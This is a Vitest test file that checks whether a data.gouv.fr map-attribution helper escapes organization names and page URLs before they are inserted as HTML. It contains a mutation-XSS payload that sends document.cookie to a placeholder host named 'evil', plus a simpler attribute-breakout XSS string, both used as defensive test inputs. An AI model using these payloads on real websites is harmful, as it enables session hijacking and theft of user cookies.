import { describe, expect, it } from 'vitest'
import { getMapAttribution } from '~/datagouv-components/src/functions/owned'
import type { Owned } from '~/datagouv-components/src/types/owned'

const withOrg = (name: string, page = 'https://demo.data.gouv.fr/organizations/x/'): Owned =>
  ({ organization: { name, page }, owner: null } as unknown as Owned)

describe('getMapAttribution', () => {
  // maplibre-gl injects the returned string into the DOM as HTML. The owner name
  // is free text (organization name / profile name), so the mutation-XSS payload
  // that survives maplibre's attribution sanitizer must be neutralised here.
  it('escapes the owner name instead of injecting live markup', () => {
    const payload = 'AuditC7 <math><mtext><table><mglyph><style><img src=x onerror="new Image().src=`//evil/`+document.cookie">'
    const attribution = getMapAttribution(withOrg(payload))

    expect(attribution).not.toContain('<img')
    expect(attribution).not.toContain('<style>')
    expect(attribution).not.toContain('onerror="')
    expect(attribution).toContain('&lt;img src=x onerror=&quot;')
  })

  it('escapes the page URL used as the link href', () => {
    const attribution = getMapAttribution(withOrg('Org', 'https://x/"><img src=x onerror=alert(1)>'))

    expect(attribution).not.toContain('"><img')
    expect(attribution).toContain('&quot;&gt;&lt;img')
  })

  it('returns an empty string when there is neither organization nor owner', () => {
    expect(getMapAttribution({ organization: null, owner: null } as unknown as Owned)).toBe('')
  })
})
